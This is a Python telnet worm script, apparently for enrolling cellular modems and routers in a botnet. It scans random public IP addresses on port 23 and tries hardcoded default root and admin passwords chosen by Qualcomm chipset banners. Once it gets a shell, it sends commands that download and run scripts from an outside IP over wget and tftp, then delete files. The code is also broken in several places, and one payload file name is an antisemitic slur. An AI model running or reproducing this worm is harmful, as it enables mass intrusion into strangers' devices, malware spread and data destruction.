#!/usr/bin/python
# Phone Swiper Scanner 
 
import threading, sys, time, random, socket, re, os
 
if len(sys.argv) < 2:
    print ("Phone Swiper Scanner\n")
    print ("Usage: python "+sys.argv[0]+" <threads(1-100+)> ")
    sys.exit()
 
usernames = ["root", "root", "root", "admin"]
passwords = ["oelinux123", "mdm9607",  "zte9x15", "admin"]
url = "http://81.28.6.115/ass.arm4" # ARM4 Bin
threads = int(sys.argv[1])


def readUntil(tn, string, timeout=8):
    buf = ''
    start_time = time.time()
    while time.time() - start_time < timeout:
        buf += tn.recv(1024)
        time.sleep(0.01)
        if string in buf: return buf
    raise Exception('TIMEOUT!')



def Gen_IP():
    not_valid = [10,127,169,172,192,145]
    first = random.randrange(1,256)
    while first in not_valid:
        first = random.randrange(1,256)
    IP = ".".join([str(first),str(random.randrange(1,256)),
    str(random.randrange(1,256)),str(random.randrange(1,256))])
    return IP

def HaxThread():
    while 1:
        try:
            tn=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            tn=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            tn.settimeout(370)
            IP = Gen_IP()
            tn.connect((IP, 23)
            tn.close()
            print ("\033[32m[\033[31m+\033[32m] FOUND " + IP)
            thread = telnet(IP)
            thread.start()
        except:
            pass

if __name__ == "__main__":
    threadcount = 0
    for i in range(0,threads):
        try:
            threading.Thread(target=HaxThread, args=()).start()
            threadcount += 6
        except:
            pass
    print ("[*] Started " + str(threadcount) + " scanner threads!")

                
                        

class telnet(threading.Thread):
        def __init__ (self, IP):
            threading.Thread.__init__(self)
            self.ip = str(IP).rstrip('\n')
        def run(self):
            try:
                tn=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                tn=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                tn.settimeout(8)
                tn.connect((self.IP,23))
            except Exception:
                pass
            try:
                hoho = ''
                hoho += readUntil(tn, ":")
                if "SDX50" in hoho:
                    username = usernames[1]
                    password = passwords[1]
                    tn.send(username + "\n")
                if "SDX55" in hoho:
                    username = usernames[1]
                    password = passwords[1]
                    tn.send(username + "\n")
                if "SDX60" in hoho:
                    username = usernames[1]
                    password = passwords[1]
                    tn.send(username + "\n")
                if "SDX62" in hoho:
                    username = usernames[1]
                    password = passwords[1]
                    tn.send(username + "\n")
                if "SDX65" in hoho:
                    username = usernames[1]
                    password = passwords[1]
                    tn.send(username + "\n")
                if "SDX70" in hoho:
                    username = usernames[1]
                    password = passwords[1]
                    tn.send(username + "\n")
                if "MDM9x55" in hoho:
                    username = usernames[1]
                    password = passwords[1]
                    tn.send(username + "\n")
                if "MDM9x65" in hoho:
                    username = usernames[1]
                    password = passwords[1]
                    tn.send(username + "\n")
                if "FSM100xx" in hoho:
                    username = usernames[1]
                    password = passwords[1]
                    tn.send(username + "\n")
                if "MDM9206" in hoho:
                    username = usernames[1]
                    password = passwords[1]
                    tn.send(username + "\n")
                if "MDM9207-1" in hoho:
                    username = usernames[1]
                    password = passwords[1]
                    tn.send(username + "\n")
                if "MDM9250" in hoho:
                    username = usernames[1]
                    password = passwords[1]
                    tn.send(username + "\n")
                if "MDM9240" in hoho:
                    username = usernames[1]
                    password = passwords[1]
                    tn.send(username + "\n")
                if "9615-cdp" in hoho:
                    username = usernames[1]
                    password = passwords[1]
                    tn.send(username + "\n")
                if "SDX50" in hoho:
                    username = usernames[2]
                    password = passwords[2]
                    tn.send(username + "\n")
                if "SDX55" in hoho:
                    username = usernames[2]
                    password = passwords[2]
                    tn.send(username + "\n")
                if "SDX60" in hoho:
                    username = usernames[2]
                    password = passwords[2]
                    tn.send(username + "\n")
                if "SDX62" in hoho:
                    username = usernames[2]
                    password = passwords[2]
                    tn.send(username + "\n")
                if "SDX65" in hoho:
                    username = usernames[2]
                    password = passwords[2]
                    tn.send(username + "\n")
                if "SDX70" in hoho:
                    username = usernames[2]
                    password = passwords[2]
                    tn.send(username + "\n")
                if "MDM9x55" in hoho:
                    username = usernames[2]
                    password = passwords[2]
                    tn.send(username + "\n")
                if "MDM9x65" in hoho:
                    username = usernames[2]
                    password = passwords[2]
                    tn.send(username + "\n")
                if "FSM100xx" in hoho:
                    username = usernames[2]
                    password = passwords[2]
                    tn.send(username + "\n")
                if "MDM9206" in hoho:
                    username = usernames[2]
                    password = passwords[2]
                    tn.send(username + "\n")
                if "MDM9207-1" in hoho:
                    username = usernames[2]
                    password = passwords[2]
                    tn.send(username + "\n")
                if "MDM9250" in hoho:
                    username = usernames[2]
                    password = passwords[2]
                    tn.send(username + "\n")
                if "MDM9240" in hoho:
                    username = usernames[2]
                    password = passwords[2]
                    tn.send(username + "\n")
                if "9615-cdp" in hoho:
                    username = usernames[2]
                    password = passwords[2]
                    tn.send(username + "\n")
                if "SDX50" in hoho:
                    username = usernames[3]
                    password = passwords[3]
                    tn.send(username + "\n")
                if "SDX55" in hoho:
                    username = usernames[3]
                    password = passwords[3]
                    tn.send(username + "\n")
                if "SDX60" in hoho:
                    username = usernames[3]
                    password = passwords[3]
                    tn.send(username + "\n")
                if "SDX62" in hoho:
                    username = usernames[3]
                    password = passwords[3]
                    tn.send(username + "\n")
                if "SDX65" in hoho:
                    username = usernames[3]
                    password = passwords[3]
                    tn.send(username + "\n")
                if "SDX70" in hoho:
                    username = usernames[3]
                    password = passwords[3]
                    tn.send(username + "\n")
                if "MDM9x55" in hoho:
                    username = usernames[3]
                    password = passwords[3]
                    tn.send(username + "\n")
                if "MDM9x65" in hoho:
                    username = usernames[3]
                    password = passwords[3]
                    tn.send(username + "\n")
                if "FSM100xx" in hoho:
                    username = usernames[3]
                    password = passwords[3]
                    tn.send(username + "\n")
                if "MDM9206" in hoho:
                    username = usernames[3]
                    password = passwords[3]
                    tn.send(username + "\n")
                if "MDM9207-1" in hoho:
                    username = usernames[3]
                    password = passwords[3]
                    tn.send(username + "\n")
                if "MDM9250" in hoho:
                    username = usernames[3]
                    password = passwords[3]
                    tn.send(username + "\n")
                if "MDM9240" in hoho:
                    username = usernames[3]
                    password = passwords[3]
                    tn.send(username + "\n")
                if "9615-cdp" in hoho:
                    username = usernames[3]
                    password = passwords[3]
                    tn.send(username + "\n")   
                if "SDX50" in hoho:
                    username = usernames[4]
                    password = passwords[4]
                    tn.send(username + "\n")
                if "SDX55" in hoho:
                    username = usernames[4]
                    password = passwords[4]
                    tn.send(username + "\n")
                if "SDX60" in hoho:
                    username = usernames[4]
                    password = passwords[4]
                    tn.send(username + "\n")
                if "SDX62" in hoho:
                    username = usernames[4]
                    password = passwords[4]
                    tn.send(username + "\n")
                if "SDX65" in hoho:
                    username = usernames[4]
                    password = passwords[4]
                    tn.send(username + "\n")
                if "SDX70" in hoho:
                    username = usernames[4]
                    password = passwords[4]
                    tn.send(username + "\n")
                if "MDM9x55" in hoho:
                    username = usernames[4]
                    password = passwords[4]
                    tn.send(username + "\n")
                if "MDM9x65" in hoho:
                    username = usernames[4]
                    password = passwords[4]
                    tn.send(username + "\n")
                if "FSM100xx" in hoho:
                    username = usernames[4]
                    password = passwords[4]
                    tn.send(username + "\n")
                if "MDM9206" in hoho:
                    username = usernames[4]
                    password = passwords[4]
                    tn.send(username + "\n")
                if "MDM9207-1" in hoho:
                    username = usernames[4]
                    password = passwords[4]
                    tn.send(username + "\n")
                if "MDM9250" in hoho:
                    username = usernames[4]
                    password = passwords[4]
                    tn.send(username + "\n")
                if "MDM9240" in hoho:
                    username = usernames[4]
                    password = passwords[4]
                    tn.send(username + "\n")
                if "9615-cdp" in hoho:
                    username = usernames[4]
                    password = passwords[4]
                    tn.send(username + "\n")   
            except Exception:
                pass
            try:
                hoho = ''
                hoho += readUntil(tn, ":")
                if "assword" in hoho:
                    tn.send(password + "\n")
                    time.sleep(3.5)
            except Exception:
                pass
            try:
                mp = ''
                mp += tn.recv(1024)
                if "#" in mp or "$" in mp or "~#" in mp or "~" in mp or ">" in mp or "root@" in mp:  
		tn.send("wget http://103.6.169.203/fuckjewishpeople.sh; chmod 777 fuckjewishpeople.sh; sh fuckjewishpeople.sh; tftp 103.6.169.203 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 103.6.169.203; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf *"); print ("\033[32m[PHONE] Command Sent %s!\033[37m"%(self.ip)); time.sleep(8); tn.close()
                success = True
            except Exception:
                pass


